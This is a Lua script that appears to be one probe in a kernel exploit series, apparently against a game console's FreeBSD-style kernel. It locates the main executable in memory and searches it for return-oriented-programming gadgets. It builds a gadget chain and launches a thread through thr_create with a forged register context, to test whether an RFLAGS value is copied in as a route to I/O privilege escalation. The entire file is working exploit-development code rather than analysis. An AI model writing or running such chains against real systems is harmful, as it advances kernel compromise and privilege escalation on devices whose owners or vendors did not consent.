-- CRASH_CLASS: HIGH
-- PROBE 767f: does thr_create restore RFLAGS from the context?
--
-- 729b proved a native child runs a gadget chain. If the kernel copies the
-- context's flags field into the new thread's RFLAGS, a distinctive user-legal
-- value (0x246 = IF|PF|ZF) shows up in a pushfq inside the child. IOPL would
-- then be the hardware route.  Baseline (no field written) must read 0x202.
print("=== PROBE 767f: IOPL CONTEXT off=0x0F0 ===")
local function to_num(v)
    if type(v)=="table" and v.tonumber then return v:tonumber() end
    if type(v)=="table" and v.h then return v.h*4294967296+v.l end
    return tonumber(v) or 0
end
local function mk(n) local t={} for k,v in pairs(syscall.pipe) do t[k]=v end t.syscall_no=n setmetatable(t,getmetatable(syscall.pipe)) return t end
local function U(a) a=to_num(a) return uint64(string.format("0x%08X%08X",math.floor(a/4294967296),a%4294967296)) end
local function call(sc,a1,a2,a3,a4,a5,a6)
    local ok,r=pcall(function() return sc(U(a1),U(a2),U(a3),U(a4),U(a5),U(a6)) end)
    if not ok then return "DEAD" end
    return to_num(r)
end
local function rd(a) local o,v=pcall(function() return memory.read_dword(a) end) if o then return to_num(v) end end
local function rq(a) local o,v=pcall(function() return memory.read_qword(a) end) if o then return to_num(v) end end
local function wd(a,v) pcall(function() memory.write_dword(a,v) end) end
local function wq(a,v) pcall(function() memory.write_qword(a,v) end) end
local function zero(a,n) pcall(function() for i=0,n-8,8 do memory.write_qword(a+i,0) end end) end
local function mmap(px)
    local ok,r=pcall(function() return mk(477)(uint64(0),uint64(px),uint64(3),uint64(0x1002),uint64(0xFFFFFFFF),uint64(0)) end)
    if not ok then return 0 end
    local a=to_num(r); if a>0 then zero(a,px) end; return a
end
local FLAGS=0x246
local rb=mmap(0x8000)
if rb==0 then print("[A] mmap failed") return end
local cnt=to_num(memory.alloc(8)); wd(cnt,0)
call(mk(674),rb,72,512,cnt,0x40000000,0)
local n=rd(cnt) or 0
local ebase,bsz=nil,0
for i=0,math.min(n,512)-1 do
    local r=rb+i*72
    local a=rd(r)+ (rd(r+4) or 0)*4294967296
    local b=rd(r+8)+(rd(r+12) or 0)*4294967296
    if rd(r+0x18)==5 and (b-a)>0x200000 and a<0x1000000000 and (b-a)>bsz then ebase,bsz=a,b-a end
end
if not ebase then print("[A] no eboot") return end
print(string.format("[A] eboot=%X size=%X",ebase,bsz))
local function find_pat(base,size,pat)
    local off,limit,chunk=0,size-0x20,0x8000
    while off<limit do
        local want=limit-off; if want>chunk then want=chunk end
        local ok,s=pcall(function() return memory.read_buffer(base+off,want) end)
        if not ok or type(s)~="string" then return nil end
        local i=string.find(s,pat,1,true)
        if i then return base+off+i-1 end
        off=off+want
    end
    return nil
end
local pop_rdi=find_pat(ebase,bsz,string.char(0x5F,0xC3))
local pop_rax=find_pat(ebase,bsz,string.char(0x58,0xC3))
local pf_rsi =find_pat(ebase,bsz,string.char(0x9C,0x5E,0xC3))
local pf_rax =find_pat(ebase,bsz,string.char(0x9C,0x58,0xC3))
local mv_disi=find_pat(ebase,bsz,string.char(0x48,0x89,0x37,0xC3))
local mv_dirax=find_pat(ebase,bsz,string.char(0x48,0x89,0x07,0xC3))
local jmp_g  =find_pat(ebase,bsz,string.char(0xEB,0xFE))
print(string.format("[B] pop_rdi=%s pop_rax=%s pf_rsi=%s pf_rax=%s mv_rsi=%s mv_rax=%s jmp=%s",
    tostring(pop_rdi),tostring(pop_rax),tostring(pf_rsi),tostring(pf_rax),tostring(mv_disi),tostring(mv_dirax),tostring(jmp_g)))
if not (pop_rax and jmp_g and (pf_rsi and mv_disi or pf_rax and mv_dirax)) then print("[B] missing gadgets") return end
local fn=to_num(syscall.pipe.fn_addr)
local stack=mmap(0x2000); local status=mmap(0x1000)
if stack==0 or status==0 then print("[C] mmap2 failed") return end
local chain={}
if pf_rsi and mv_disi then
    chain={pop_rdi,status,pf_rsi,mv_disi}
elseif pf_rax and mv_dirax then
    chain={pop_rdi,status,pf_rax,mv_dirax}
else
    print("[B] no usable pair") return
end
chain[#chain+1]=pop_rax; chain[#chain+1]=431; chain[#chain+1]=fn; chain[#chain+1]=jmp_g
local base=stack+0x1000
for i=1,#chain do wq(base+(i-1)*8,chain[i]) end
local ctx=to_num(memory.alloc(0x500)); zero(ctx,0x500)
wq(ctx+0x108,uint64(0x480)); wq(ctx+0x110,uint64(0x10000))
wq(ctx+0x0C0,uint64(0x43));  wq(ctx+0x100,uint64(0x3B))
wq(ctx+0x0E0,uint64(fn));    wq(ctx+0x0F8,uint64(base))
wq(ctx + 0x0F0, uint64(FLAGS))
local tid=to_num(memory.alloc(0x40)); zero(tid,0x40)
local r=call(mk(430),ctx,tid,0,0,0,0)
print(string.format("[C] thr_create rv=%s tid=%X",tostring(r),rd(tid) or 0))
local waited=0
for i=1,60000 do
    local f=rd(status) or 0
    if f~=0 then break end
    waited=waited+1
end
print(string.format("[D] flags=%08X waited=%d alive=%s",rd(status) or 0,waited,tostring(call(syscall.pipe,20,0,0,0,0,0,0))))
print("=== 767f DONE ===")
